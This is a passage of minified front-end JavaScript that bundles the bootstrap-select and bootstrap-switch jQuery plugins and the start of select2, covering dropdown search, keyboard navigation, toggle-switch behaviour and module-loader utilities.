b[0].replace("{n}", h), y = b[1].replace("{n}", d), v = J('<div class="notify"></div>'); b[2] && (B = B.replace("{var}", b[2][1 < h ? 0 : 1]), y = y.replace("{var}", b[2][1 < d ? 0 : 1])), l.prop("selected", !1), x.$menu.append(v), h && C && (v.append(J("<div>" + B + "</div>")), r = !1, x.$element.trigger("maxReached" + U)), d && A && (v.append(J("<div>" + y + "</div>")), r = !1, x.$element.trigger("maxReachedGrp" + U)), setTimeout(function () { x.setSelected(o, !1) }, 10), v.delay(750).fadeOut(300, function () { J(this).remove() }) } } } else g.prop("selected", !1), l.prop("selected", !0), x.setSelected(o, !0); !x.multiple || x.multiple && 1 === x.options.maxOptions ? x.$button.focus() : x.options.liveSearch && x.$searchbox.focus(), r && (a != F(x.$element[0]) && x.multiple || s != x.$element.prop("selectedIndex") && !x.multiple) && (Q = [o, l.prop("selected"), a], x.$element.triggerNative("change")) } }), this.$menu.on("click", "li." + q.DISABLED + " a, ." + q.POPOVERHEADER + ", ." + q.POPOVERHEADER + " :not(.close)", function (t) { t.currentTarget == this && (t.preventDefault(), t.stopPropagation(), x.options.liveSearch && !J(t.target).hasClass("close") ? x.$searchbox.focus() : x.$button.focus()) }), this.$menuInner.on("click", ".divider, .dropdown-header", function (t) { t.preventDefault(), t.stopPropagation(), x.options.liveSearch ? x.$searchbox.focus() : x.$button.focus() }), this.$menu.on("click", "." + q.POPOVERHEADER + " .close", function () { x.$button.click() }), this.$searchbox.on("click", function (t) { t.stopPropagation() }), this.$menu.on("click", ".actions-btn", function (t) { x.options.liveSearch ? x.$searchbox.focus() : x.$button.focus(), t.preventDefault(), t.stopPropagation(), J(this).hasClass("bs-select-all") ? x.selectAll() : x.deselectAll() }), this.$element.on({ change: function () { x.render(), x.$element.trigger("changed" + U, Q), Q = null }, focus: function () { x.options.mobile || x.$button.focus() } }) }, liveSearchListener: function () { var h = this, d = document.createElement("li"); this.$button.on("click.bs.dropdown.data-api", function () { h.$searchbox.val() && h.$searchbox.val("") }), this.$searchbox.on("click.bs.dropdown.data-api focus.bs.dropdown.data-api touchend.bs.dropdown.data-api", function (t) { t.stopPropagation() }), this.$searchbox.on("input propertychange", function () { var t = h.$searchbox.val(); if (h.selectpicker.search.map.newIndex = {}, h.selectpicker.search.map.originalIndex = {}, h.selectpicker.search.elements = [], h.selectpicker.search.data = [], t) { var e = [], n = t.toUpperCase(), i = {}, o = [], a = h._searchStyle(), s = h.options.liveSearchNormalize; s && (n = C(n)), h._$lisSelected = h.$menuInner.find(".selected"); for (var r = 0; r < h.selectpicker.main.data.length; r++) { var g = h.selectpicker.main.data[r]; i[r] || (i[r] = v(g, n, a, s)), i[r] && void 0 !== g.headerIndex && -1 === o.indexOf(g.headerIndex) && (0 < g.headerIndex && (i[g.headerIndex - 1] = !0, o.push(g.headerIndex - 1)), i[g.headerIndex] = !0, o.push(g.headerIndex), i[g.lastIndex + 1] = !0), i[r] && "optgroup-label" !== g.type && o.push(r) } for (var r = 0, l = o.length; r < l; r++) { var c = o[r], I = o[r - 1], g = h.selectpicker.main.data[c], u = h.selectpicker.main.data[I]; ("divider" !== g.type || "divider" === g.type && u && "divider" !== u.type && l - 1 !== r) && (h.selectpicker.search.data.push(g), e.push(h.selectpicker.main.elements[c]), g.hasOwnProperty("originalIndex") && (h.selectpicker.search.map.newIndex[g.originalIndex] = e.length - 1, h.selectpicker.search.map.originalIndex[e.length - 1] = g.originalIndex)) } h.activeIndex = void 0, h.noScroll = !0, h.$menuInner.scrollTop(0), h.selectpicker.search.elements = e, h.createView(!0), e.length || (d.className = "no-results", d.innerHTML = h.options.noneResultsText.replace("{0}", '"' + j(t) + '"'), h.$menuInner[0].firstChild.appendChild(d)) } else h.$menuInner.scrollTop(0), h.createView(!1) }) }, _searchStyle: function () { return this.options.liveSearchStyle || "contains" }, val: function (t) { return void 0 !== t ? (this.$element.val(t).triggerNative("change"), this.$element) : this.$element.val() }, changeAll: function (t) { if (this.multiple) { void 0 === t && (t = !0); var e = this.$element.find("option"), n = 0, i = 0, o = F(this.$element[0]); this.$element.addClass("bs-select-hidden"); for (var a = 0; a < this.selectpicker.current.elements.length; a++) { var s = this.selectpicker.current.data[a], r = e[this.selectpicker.current.map.originalIndex[a]]; r && !r.disabled && "divider" !== s.type && (r.selected && n++, r.selected = t, r.selected && i++) } this.$element.removeClass("bs-select-hidden"), n !== i && (this.setOptionStatus(), this.togglePlaceholder(), Q = [null, null, o], this.$element.triggerNative("change")) } }, selectAll: function () { return this.changeAll(!0) }, deselectAll: function () { return this.changeAll(!1) }, toggle: function (t) { (t = t || window.event) && t.stopPropagation(), this.$button.trigger("click.bs.dropdown.data-api") }, keydown: function (t) { var e, n, i, o, a = J(this), s = a.hasClass("dropdown-toggle"), r = (s ? a.closest(".dropdown") : a.closest(W.MENU)).data("this"), g = r.findLis(), l = !1, c = t.which === k && !s && !r.options.selectOnTab, I = N.test(t.which) || c, u = r.$menuInner[0].scrollTop, h = r.isVirtual(), d = !0 === h ? r.selectpicker.view.position0 : 0, C = r.$newElement.hasClass(q.SHOW); if (!C && (I || 48 <= t.which && t.which <= 57 || 96 <= t.which && t.which <= 105 || 65 <= t.which && t.which <= 90) && r.$button.trigger("click.bs.dropdown.data-api"), t.which === G && C && (t.preventDefault(), r.$button.trigger("click.bs.dropdown.data-api").focus()), I) { if (!g.length) return; void 0 === (e = !0 === h ? g.index(g.filter(".active")) : r.selectpicker.current.map.newIndex[r.activeIndex]) && (e = -1), -1 !== e && ((n = r.selectpicker.current.elements[e + d]).classList.remove("active"), n.firstChild && n.firstChild.classList.remove("active")), t.which === D ? (-1 !== e && e--, e + d < 0 && (e += g.length), r.selectpicker.view.canHighlight[e + d] || -1 === (e = r.selectpicker.view.canHighlight.slice(0, e + d).lastIndexOf(!0) - d) && (e = g.length - 1)) : t.which !== Z && !c || (++e + d >= r.selectpicker.view.canHighlight.length && (e = 0), r.selectpicker.view.canHighlight[e + d] || (e = e + 1 + r.selectpicker.view.canHighlight.slice(e + d + 1).indexOf(!0))), t.preventDefault(); var A = d + e; t.which === D ? 0 === d && e === g.length - 1 ? (r.$menuInner[0].scrollTop = r.$menuInner[0].scrollHeight, A = r.selectpicker.current.elements.length - 1) : l = (o = (i = r.selectpicker.current.data[A]).position - i.height) < u : t.which !== Z && !c || (0 === e ? A = r.$menuInner[0].scrollTop = 0 : l = u < (o = (i = r.selectpicker.current.data[A]).position - r.sizeInfo.menuInnerHeight)), (n = r.selectpicker.current.elements[A]) && (n.classList.add("active"), n.firstChild && n.firstChild.classList.add("active")), r.activeIndex = r.selectpicker.current.map.originalIndex[A], r.selectpicker.view.currentActive = n, l && (r.$menuInner[0].scrollTop = o), r.options.liveSearch ? r.$searchbox.focus() : a.focus() } else if (!a.is("input") && !T.test(t.which) || t.which === S && r.selectpicker.keydown.keyHistory) { var p, m, f = []; t.preventDefault(), r.selectpicker.keydown.keyHistory += x[t.which], r.selectpicker.keydown.resetKeyHistory.cancel && clearTimeout(r.selectpicker.keydown.resetKeyHistory.cancel), r.selectpicker.keydown.resetKeyHistory.cancel = r.selectpicker.keydown.resetKeyHistory.start(), m = r.selectpicker.keydown.keyHistory, /^(.)\1+$/.test(m) && (m = m.charAt(0)); for (var b, B = 0; B < r.selectpicker.current.data.length; B++) { var y = r.selectpicker.current.data[B]; v(y, m, "startsWith", !0) && r.selectpicker.view.canHighlight[B] && (y.index = B, f.push(y.originalIndex)) } f.length && (b = 0, g.removeClass("active").find("a").removeClass("active"), 1 === m.length && (-1 === (b = f.indexOf(r.activeIndex)) || b === f.length - 1 ? b = 0 : b++), p = r.selectpicker.current.map.newIndex[f[b]], l = 0 < u - (i = r.selectpicker.current.data[p]).position ? (o = i.position - i.height, !0) : (o = i.position - r.sizeInfo.menuInnerHeight, i.position > u + r.sizeInfo.menuInnerHeight), (n = r.selectpicker.current.elements[p]).classList.add("active"), n.firstChild && n.firstChild.classList.add("active"), r.activeIndex = f[b], n.firstChild.focus(), l && (r.$menuInner[0].scrollTop = o), a.focus()) } C && (t.which === S && !r.selectpicker.keydown.keyHistory || t.which === w || t.which === k && r.options.selectOnTab) && (t.which !== S && t.preventDefault(), r.options.liveSearch && t.which === S || (r.$menuInner.find(".active a").trigger("click", !0), a.focus(), r.options.liveSearch || (t.preventDefault(), J(document).data("spaceSelect", !0)))) }, mobile: function () { this.$element.addClass("mobile-device") }, refresh: function () { var t = J.extend({}, this.options, this.$element.data()); this.options = t, this.selectpicker.main.map.newIndex = {}, this.selectpicker.main.map.originalIndex = {}, this.createLi(), this.checkDisabled(), this.render(), this.setStyle(), this.setWidth(), this.setSize(!0), this.$element.trigger("refreshed" + U) }, hide: function () { this.$newElement.hide() }, show: function () { this.$newElement.show() }, remove: function () { this.$newElement.remove(), this.$element.remove() }, destroy: function () { this.$newElement.before(this.$element).remove(), this.$bsContainer ? this.$bsContainer.remove() : this.$menu.remove(), this.$element.off(U).removeData("selectpicker").removeClass("bs-select-hidden selectpicker"), J(window).off(U + "." + this.selectId) } }; var p = J.fn.selectpicker; J.fn.selectpicker = d, J.fn.selectpicker.Constructor = h, J.fn.selectpicker.noConflict = function () { return J.fn.selectpicker = p, this }, J(document).off("keydown.bs.dropdown.data-api").on("keydown" + U, '.bootstrap-select [data-toggle="dropdown"], .bootstrap-select [role="listbox"], .bootstrap-select .bs-searchbox input', h.prototype.keydown).on("focusin.modal", '.bootstrap-select [data-toggle="dropdown"], .bootstrap-select [role="listbox"], .bootstrap-select .bs-searchbox input', function (t) { t.stopPropagation() }), J(window).on("load" + U + ".data-api", function () { J(".selectpicker").each(function () { var t = J(this); d.call(t, t.data()) }) }) }(t) }), function (t, e) { "function" == typeof define && define.amd ? define(["jquery"], e) : "undefined" != typeof exports ? e(require("jquery")) : (e(t.jquery), t.bootstrapSwitch = {}) }(this, function (t) { "use strict"; var e, n = (e = t) && e.__esModule ? e : { default: e }; var i = Object.assign || function (t) { for (var e = 1; e < arguments.length; e++) { var n = arguments[e]; for (var i in n) Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]) } return t }; var o = function (t, e, n) { return e && a(t.prototype, e), n && a(t, n), t }; function a(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } var r = n.default || window.jQuery || window.$; function s() { var n = this, t = this.$on.add(this.$off).add(this.$label).css("width", ""), i = "auto" === this.options.handleWidth ? Math.round(Math.max(this.$on.width(), this.$off.width())) : this.options.handleWidth; return t.width(i), this.$label.width(function (t, e) { return "auto" !== n.options.labelWidth ? n.options.labelWidth : e < i ? i : e }), this.privateHandleWidth = this.$on.outerWidth(), this.privateLabelWidth = this.$label.outerWidth(), this.$container.width(2 * this.privateHandleWidth + this.privateLabelWidth), this.$wrapper.width(this.privateHandleWidth + this.privateLabelWidth) } function g() { var e = this, n = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : this.ope; this.$container.css("margin-left", function () { var t = [0, "-" + e.privateHandleWidth + "px"]; return e.options.indeterminate ? "-" + e.privateHandleWidth / 2 + "px" : n ? e.options.inverse ? t[1] : t[0] : e.options.inverse ? t[0] : t[1] }) } function l(t) { return this.options.baseClass + "-" + t } function c(t) { var e = this; return r.isArray(t) ? t.map(function (t) { return l.call(e, t) }) : [l.call(this, t)] } var I = (o(u, [{ key: "setPrevOptions", value: function () { this.prevOptions = i({}, this.options) } }, { key: "state", value: function (t, e) { return void 0 === t ? this.options.state : (this.options.disabled || this.options.readonly || this.options.state && !this.options.radioAllOff && this.$element.is(":radio") || (this.$element.is(":radio") ? r('[name="' + this.$element.attr("name") + '"]').trigger("setPreviousOptions.bootstrapSwitch") : this.$element.trigger("setPreviousOptions.bootstrapSwitch"), this.options.indeterminate && this.indeterminate(!1), this.$element.prop("checked", Boolean(t)).trigger("change.bootstrapSwitch", e)), this.$element) } }, { key: "toggleState", value: function (t) { return this.options.disabled || this.options.readonly ? this.$element : this.options.indeterminate ? (this.indeterminate(!1), this.state(!0)) : this.$element.prop("checked", !this.options.state).trigger("change.bootstrapSwitch", t) } }, { key: "size", value: function (t) { return void 0 === t ? this.options.size : (null != this.options.size && this.$wrapper.removeClass(l.call(this, this.options.size)), t && this.$wrapper.addClass(l.call(this, t)), s.call(this), g.call(this), this.options.size = t, this.$element) } }, { key: "animate", value: function (t) { return void 0 === t ? this.options.animate : this.options.animate === Boolean(t) ? this.$element : this.toggleAnimate() } }, { key: "toggleAnimate", value: function () { return this.options.animate = !this.options.animate, this.$wrapper.toggleClass(l.call(this, "animate")), this.$element } }, { key: "disabled", value: function (t) { return void 0 === t ? this.options.disabled : this.options.disabled === Boolean(t) ? this.$element : this.toggleDisabled() } }, { key: "toggleDisabled", value: function () { return this.options.disabled = !this.options.disabled, this.$element.prop("disabled", this.options.disabled), this.$wrapper.toggleClass(l.call(this, "disabled")), this.$element } }, { key: "readonly", value: function (t) { return void 0 === t ? this.options.readonly : this.options.readonly === Boolean(t) ? this.$element : this.toggleReadonly() } }, { key: "toggleReadonly", value: function () { return this.options.readonly = !this.options.readonly, this.$element.prop("readonly", this.options.readonly), this.$wrapper.toggleClass(l.call(this, "readonly")), this.$element } }, { key: "indeterminate", value: function (t) { return void 0 === t ? this.options.indeterminate : this.options.indeterminate === Boolean(t) ? this.$element : this.toggleIndeterminate() } }, { key: "toggleIndeterminate", value: function () { return this.options.indeterminate = !this.options.indeterminate, this.$element.prop("indeterminate", this.options.indeterminate), this.$wrapper.toggleClass(l.call(this, "indeterminate")), g.call(this), this.$element } }, { key: "inverse", value: function (t) { return void 0 === t ? this.options.inverse : this.options.inverse === Boolean(t) ? this.$element : this.toggleInverse() } }, { key: "toggleInverse", value: function () { this.$wrapper.toggleClass(l.call(this, "inverse")); var t = this.$on.clone(!0), e = this.$off.clone(!0); return this.$on.replaceWith(e), this.$off.replaceWith(t), this.$on = e, this.$off = t, this.options.inverse = !this.options.inverse, this.$element } }, { key: "onColor", value: function (t) { return void 0 === t ? this.options.onColor : (this.options.onColor && this.$on.removeClass(l.call(this, this.options.onColor)), this.$on.addClass(l.call(this, t)), this.options.onColor = t, this.$element) } }, { key: "offColor", value: function (t) { return void 0 === t ? this.options.offColor : (this.options.offColor && this.$off.removeClass(l.call(this, this.options.offColor)), this.$off.addClass(l.call(this, t)), this.options.offColor = t, this.$element) } }, { key: "onText", value: function (t) { return void 0 === t ? this.options.onText : (this.$on.html(t), s.call(this), g.call(this), this.options.onText = t, this.$element) } }, { key: "offText", value: function (t) { return void 0 === t ? this.options.offText : (this.$off.html(t), s.call(this), g.call(this), this.options.offText = t, this.$element) } }, { key: "labelText", value: function (t) { return void 0 === t ? this.options.labelText : (this.$label.html(t), s.call(this), this.options.labelText = t, this.$element) } }, { key: "handleWidth", value: function (t) { return void 0 === t ? this.options.handleWidth : (this.options.handleWidth = t, s.call(this), g.call(this), this.$element) } }, { key: "labelWidth", value: function (t) { return void 0 === t ? this.options.labelWidth : (this.options.labelWidth = t, s.call(this), g.call(this), this.$element) } }, { key: "baseClass", value: function () { return this.options.baseClass } }, { key: "wrapperClass", value: function (t) { if (void 0 === t) return this.options.wrapperClass; var e = t || r.fn.bootstrapSwitch.defaults.wrapperClass; return this.$wrapper.removeClass(c.call(this, this.options.wrapperClass).join(" ")), this.$wrapper.addClass(c.call(this, e).join(" ")), this.options.wrapperClass = e, this.$element } }, { key: "radioAllOff", value: function (t) { if (void 0 === t) return this.options.radioAllOff; var e = Boolean(t); return this.options.radioAllOff === e || (this.options.radioAllOff = e), this.$element } }, { key: "onInit", value: function (t) { return void 0 === t ? this.options.onInit : (this.options.onInit = t || r.fn.bootstrapSwitch.defaults.onInit, this.$element) } }, { key: "onSwitchChange", value: function (t) { return void 0 === t ? this.options.onSwitchChange : (this.options.onSwitchChange = t || r.fn.bootstrapSwitch.defaults.onSwitchChange, this.$element) } }, { key: "destroy", value: function () { var t = this.$element.closest("form"); return t.length && t.off("reset.bootstrapSwitch").removeData("bootstrap-switch"), this.$container.children().not(this.$element).remove(), this.$element.unwrap().unwrap().off(".bootstrapSwitch").removeData("bootstrap-switch"), this.$element } }]), u); function u(i) { var o = this, t = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}; !function (t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") }(this, u), this.$element = r(i), this.options = r.extend({}, r.fn.bootstrapSwitch.defaults, function () { return { state: this.$element.is(":checked"), size: this.$element.data("size"), animate: this.$element.data("animate"), disabled: this.$element.is(":disabled"), readonly: this.$element.is("[readonly]"), indeterminate: this.$element.data("indeterminate"), inverse: this.$element.data("inverse"), radioAllOff: this.$element.data("radio-all-off"), onColor: this.$element.data("on-color"), offColor: this.$element.data("off-color"), onText: this.$element.data("on-text"), offText: this.$element.data("off-text"), labelText: this.$element.data("label-text"), handleWidth: this.$element.data("handle-width"), labelWidth: this.$element.data("label-width"), baseClass: this.$element.data("base-class"), wrapperClass: this.$element.data("wrapper-class") } }.call(this), t), this.prevOptions = {}, this.$wrapper = r("<div>", { class: function () { return t = o.options, e = o.$element.attr("id"), [t.state ? "on" : "off", t.size, t.disabled ? "disabled" : void 0, t.readonly ? "readonly" : void 0, t.indeterminate ? "indeterminate" : void 0, t.inverse ? "inverse" : void 0, e ? "id-" + e : void 0].filter(function (t) { return null == t }).map(function (t) { return l.call(o, t) }).concat([o.options.baseClass], c.call(o, o.options.wrapperClass)).join(" "); var t, e } }), this.$container = r("<div>", { class: l.call(this, "container") }), this.$on = r("<span>", { html: this.options.onText, class: l.call(this, "handle-on") + " " + l.call(this, this.options.onColor) }), this.$off = r("<span>", { html: this.options.offText, class: l.call(this, "handle-off") + " " + l.call(this, this.options.offColor) }), this.$label = r("<span>", { html: this.options.labelText, class: l.call(this, "label") }), this.$element.on("init.bootstrapSwitch", function () { return o.options.onInit(i) }), this.$element.on("switchChange.bootstrapSwitch", function () { for (var t = arguments.length, e = Array(t), n = 0; n < t; n++)e[n] = arguments[n]; !1 === o.options.onSwitchChange.apply(i, e) && (o.$element.is(":radio") ? r('[name="' + o.$element.attr("name") + '"]').trigger("previousState.bootstrapSwitch", !0) : o.$element.trigger("previousState.bootstrapSwitch", !0)) }), this.$container = this.$element.wrap(this.$container).parent(), this.$wrapper = this.$container.wrap(this.$wrapper).parent(), this.$element.before(this.options.inverse ? this.$off : this.$on).before(this.$label).before(this.options.inverse ? this.$on : this.$off), this.options.indeterminate && this.$element.prop("indeterminate", !0), function () { function t() { n.setPrevOptions(), s.call(n), g.call(n), setTimeout(function () { return n.options.animate && n.$wrapper.addClass(l.call(n, "animate")) }, 50) } var e, n = this; this.$wrapper.is(":visible") ? t() : e = window.setInterval(function () { return n.$wrapper.is(":visible") && (t(), !0) && window.clearInterval(e) }, 50) }.call(this), function () { var i = this; return this.$element.on({ "setPreviousOptions.bootstrapSwitch": function () { return i.setPrevOptions() }, "previousState.bootstrapSwitch": function () { i.options = i.prevOptions, i.options.indeterminate && i.$wrapper.addClass(l.call(i, "indeterminate")), i.$element.prop("checked", i.options.state).trigger("change.bootstrapSwitch", !0) }, "change.bootstrapSwitch": function (t, e) { t.preventDefault(), t.stopImmediatePropagation(); var n = i.$element.is(":checked"); g.call(i, n), n !== i.options.state && (i.options.state = n, i.$wrapper.toggleClass(l.call(i, "off")).toggleClass(l.call(i, "on")), e || (i.$element.is(":radio") && r('[name="' + i.$element.attr("name") + '"]').not(i.$element).prop("checked", !1).trigger("change.bootstrapSwitch", !0), i.$element.trigger("switchChange.bootstrapSwitch", [n]))) }, "focus.bootstrapSwitch": function (t) { t.preventDefault(), i.$wrapper.addClass(l.call(i, "focused")) }, "blur.bootstrapSwitch": function (t) { t.preventDefault(), i.$wrapper.removeClass(l.call(i, "focused")) }, "keydown.bootstrapSwitch": function (t) { !t.which || i.options.disabled || i.options.readonly || 37 !== t.which && 39 !== t.which || (t.preventDefault(), t.stopImmediatePropagation(), i.state(39 === t.which)) } }) }.call(this), function () { var e = this; return this.$on.on("click.bootstrapSwitch", function (t) { return t.preventDefault(), t.stopPropagation(), e.state(!1), e.$element.trigger("focus.bootstrapSwitch") }), this.$off.on("click.bootstrapSwitch", function (t) { return t.preventDefault(), t.stopPropagation(), e.state(!0), e.$element.trigger("focus.bootstrapSwitch") }) }.call(this), function () { var n = this, i = void 0, o = void 0, t = { click: function (t) { t.stopPropagation() }, "mousedown.bootstrapSwitch touchstart.bootstrapSwitch": function (t) { i || n.options.disabled || n.options.readonly || (t.preventDefault(), t.stopPropagation(), i = (t.pageX || t.originalEvent.touches[0].pageX) - parseInt(n.$container.css("margin-left"), 10), n.options.animate && n.$wrapper.removeClass(l.call(n, "animate")), n.$element.trigger("focus.bootstrapSwitch")) }, "mousemove.bootstrapSwitch touchmove.bootstrapSwitch": function (t) { var e; null != i && (e = (t.pageX || t.originalEvent.touches[0].pageX) - i, t.preventDefault(), e < -n.privateHandleWidth || 0 < e || (o = e, n.$container.css("margin-left", o + "px"))) }, "mouseup.bootstrapSwitch touchend.bootstrapSwitch": function (t) { var e; i && (t.preventDefault(), n.options.animate && n.$wrapper.addClass(l.call(n, "animate")), o ? (e = o > -n.privateHandleWidth / 2, o = !1, n.state(n.options.inverse ? !e : e)) : n.state(!n.options.state), i = !1) }, "mouseleave.bootstrapSwitch": function () { n.$label.trigger("mouseup.bootstrapSwitch") } }; this.$label.on(t) }.call(this), function () { function t() { return r(this).data("bootstrap-switch") } function e() { return r(this).bootstrapSwitch("state", this.checked) } var n = this.$element.closest("form"); n.data("bootstrap-switch") || n.on("reset.bootstrapSwitch", function () { window.setTimeout(function () { n.find("input").filter(t).each(e) }, 1) }).data("bootstrap-switch", !0) }.call(this), function () { var e = this, n = this.$element.closest("label"); n.on("click", function (t) { t.preventDefault(), t.stopImmediatePropagation(), t.target === n[0] && e.toggleState() }) }.call(this), this.$element.trigger("init.bootstrapSwitch", this.options.state) } r.fn.bootstrapSwitch = function (a) { for (var t = arguments.length, s = Array(1 < t ? t - 1 : 0), e = 1; e < t; e++)s[e - 1] = arguments[e]; return Array.prototype.reduce.call(this, function (t, e) { var n = r(e), i = n.data("bootstrap-switch"), o = i || new I(e, a); return i || n.data("bootstrap-switch", o), "string" == typeof a ? o[a].apply(o, s) : t }, this) }, r.fn.bootstrapSwitch.Constructor = I, r.fn.bootstrapSwitch.defaults = { state: !0, size: null, animate: !0, disabled: !1, readonly: !1, indeterminate: !1, inverse: !1, radioAllOff: !1, onColor: "primary", offColor: "default", onText: "ON", offText: "OFF", labelText: "&nbsp", handleWidth: "auto", labelWidth: "auto", baseClass: "bootstrap-switch", wrapperClass: "wrapper", onInit: function () { }, onSwitchChange: function () { } } }), function (n) { "function" == typeof define && define.amd ? define(["jquery"], n) : "object" == typeof module && module.exports ? module.exports = function (t, e) { return void 0 === e && (e = "undefined" != typeof window ? require("jquery") : require("jquery")(t)), n(e), e } : n(jQuery) }(function (e) { var t, n, i, o, h, a, s, d, C, A, p, m, f, r, g, b, l, c = (e && e.fn && e.fn.select2 && e.fn.select2.amd && (t = e.fn.select2.amd), t && t.requirejs || (t ? i = t : t = {}, A = {}, p = {}, m = {}, f = {}, r = Object.prototype.hasOwnProperty, g = [].slice, b = /\.js$/, d = function (t, e) { var n, i, o = u(t), a = o[0], s = e[1]; return t = o[1], a && (n = v(a = I(a, s))), a ? t = n && n.normalize ? n.normalize(t, (i = s, function (t) { return I(t, i) })) : I(t, s) : (a = (o = u(t = I(t, s)))[0], t = o[1], a && (n = v(a))), { f: a ? a + "!" + t : t, n: t, pr: a, p: n } }, C = { require: function (t) { return y(t) }, exports: function (t) { var e = A[t]; return void 0 !== e ? e : A[t] = {} }, module: function (t) { return { id: t, uri: "", exports: A[t], config: (e = t, function () { return m && m.config && m.config[e] || {} }) }; var e } }, a = function (t, e, n, i) { var o, a, s, r, g, l, c = [], I = typeof n, u = x(i = i || t); if ("undefined" == I || "function" == I) { for (e = !e.length && n.length ? ["require", "exports", "module"] : e, g = 0; g < e.length; g += 1)if ("require" === (a = (r = d(e[g], u)).f)) c[g] = C.require(t); else if ("exports" === a) c[g] = C.exports(t), l = !0; else if ("module" === a) o = c[g] = C.module(t); else if (B(A, a) || B(p, a) || B(f, a)) c[g] = v(a); else { if (!r.p) throw new Error(t + " missing " + a); r.p.load(r.n, y(i, !0), function (e) { return function (t) { A[e] = t } }(a), {}), c[g] = A[a] } s = n ? n.apply(A[t], c) : void 0, t && (o && o.exports !== h && o.exports !== A[t] ? A[t] = o.exports : s === h && l || (A[t] = s)) } else t && (A[t] = n) }, n = i = s = function (t, e, n, i, o) { if ("string" == typeof t) return C[t] ? C[t](e) : v(d(t, x(e)).f); if (!t.splice) { if ((m = t).deps && s(m.deps, m.callback), !e) return; e.splice ? (t = e, e = n, n = null) : t = h } return e = e || function () { }, "function" == typeof n && (n = i, i = o), i ? a(h, t, e, n) : setTimeout(function () { a(h, t, e, n) }, 4), s }, s.config = function (t) { return s(t) }, n._defined = A, (o = function (t, e, n) { if ("string" != typeof t) throw new Error("See almond README: incorrect module build, no module name"); e.splice || (n = e, e = []), B(A, t) || B(p, t) || (p[t] = [t, e, n]) }).amd = { jQuery: !0 }, t.requirejs = n, t.require = i, t.define = o), t.define("almond", function () { }), t.define("jquery", [], function () { var t = e || $; return null == t && console && console.error && console.error("Select2: An instance of jQuery or a jQuery-compatible library was not found. Make sure that you are including jQuery before Select2 on your web page."), t }), t.define("select2/utils", ["jquery"], function (a) { var o = {}; function l(t) { var e = t.prototype, n = []; for (var i in e) "function" == typeof e[i] && "constructor" !== i && n.push(i); return n } function t() { this.listeners = {} } o.Extend = function (t, e) { var n = {}.hasOwnProperty; function i() { this.constructor = t } for (var o in e) n.call(e, o) && (t[o] = e[o]); return i.prototype = e.prototype, t.prototype = new i, t.__super__ = e.prototype, t }, o.Decorate = function (i, o) { var t = l(o), e = l(i); function a() { var t = Array.prototype.unshift, e = o.prototype.constructor.length, n = i.prototype.constructor; 0 < e && (t.call(arguments, i.prototype.constructor), n = o.prototype.constructor), n.apply(this, arguments) } o.displayName = i.displayName, a.prototype = new function () { this.constructor = a }; for (var n = 0; n < e.length; n++) { var s = e[n]; a.prototype[s] = i.prototype[s] } for (var r = 0; r < t.length; r++) { var g = t[r]; a.prototype[g] = function (t) { var e = function () { }; t in a.prototype && (e = a.prototype[t]); var n = o.prototype[t]; return function () { return Array.prototype.unshift.call(arguments, e), n.apply(this, arguments) } }(g) } return a }, t.prototype.on = function (t, e) { this.listeners = this.listeners || {}, t in this.listeners ? this.listeners[t].push(e) : this.listeners[t] = [e] }, t.prototype.trigger = function (t) { var e = Array.prototype.slice, n = e.call(arguments, 1); this.listeners = this.listeners || {}, null == n && (n = []), 0 === n.length && n.push({}), (n[0]._type = t) in this.listeners && this.invoke(this.listeners[t], e.call(arguments, 1)), "*" in this.listeners && this.invoke(this.listeners["*"], arguments) }, t.prototype.invoke = function (t, e) { for (var n = 0, i = t.length; n < i; n++)t[n].apply(this, e) }, o.Observable = t, o.generateChars = function (t) { for (var e = "", n = 0; n < t; n++)e += Math.floor(36 * Math.random()).toString(36); return e }, o.bind = function (t, e) { return function () { t.apply(e, arguments) } }, o._convertData = function (t) { for (var e in t) { var n = e.split("-"), i = t; if (1 !== n.length) { for (var o = 0; o < n.length; o++) { var a = n[o]; (a = a.substring(0, 1).toLowerCase() + a.substring(1)) in i || (i[a] = {}), o == n.length - 1 && (i[a] = t[e]), i = i[a] } delete t[e] } } return t }, o.hasScroll = function (t, e) { var n = a(e), i = e.style.overflowX, o = e.style.overflowY; return (i !== o || "hidden" !== o && "visible" !== o) && ("scroll" === i || "scroll" === o || n.innerHeight() < e.scrollHeight || n.innerWidth() < e.scrollWidth) }, o.escapeMarkup = function (t) { var e = { "\\": "&#92;", "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;", "/": "&#47;" }; return "string" != typeof t ? t : String(t).replace(/[&<>"'\/\\]/g, function (t) { return e[t] }) }, o.appendMany = function (t, e) { var n; "1.7" === a.fn.jquery.substr(0, 3) && (n = a(), a.map(e, function (t) { n = n.add(t) }), e = n), t.append(e) }, o.__cache = {}; var n = 0; return o.GetUniqueElementId = function (t) { var e = t.getAttribute("data-select2-id"); return null == e && (t.id ? (e = t.id, t.setAttribute("data-select2-id", e)) : (t.setAttribute("data-select2-id", ++n), e = n.toString())), e }, o.StoreData = function (t, e, n) { var i = o.GetUniqueElementId(t); o.__cache[i] || (o.__cache[i] = {}), o.__cache[i][e] = n }, o.GetData = function (t, e) { var n = o.GetUniqueElementId(t); return e ? o.__cache[n] && null != o.__cache[n][e] ? o.__cache[n][e] : a(t).data(e) : o.__cache[n] }, o.RemoveData = function (t) { var e = o.GetUniqueElementId(t); null != o.__cache[e] && delete o.__cache[e] }, o }), t.define("select2/results", ["jquery", "./utils"], function (u, h) { function i(t, e, n) { this.$element = t, this.data = n, this.options = e, i.__super__.constructor.call(this) } return h.Extend(i, h.Observable), i.prototype.render = function () { var t = u('<ul class="select2-results__options" role="tree"></ul>'); return this.options.get("multiple") && t.attr("aria-multiselectable", "true"), this.$results = t }, i.prototype.clear = function () { this.$results.empty() }, i.prototype.displayMessage = function (t) { var e = this.options.get("escapeMarkup"); this.clear(), this.hideLoading(); var n = u('<li role="treeitem" aria-live="assertive" class="select2-results__option"></li>'), i = this.options.get("translations").get(t.message); n.append(e(i(t.args))), n[0].className += " select2-results__message", this.$results.append(n) }, i.prototype.hideMessages = function () { this.$results.find(".select2-results__message").remove() }, i.prototype.append = function (t) { this.hideLoading(); var e = []; if (null != t.results && 0 !== t.results.length) { t.results = this.sort(t.results); for (var n = 0; n < t.results.length; 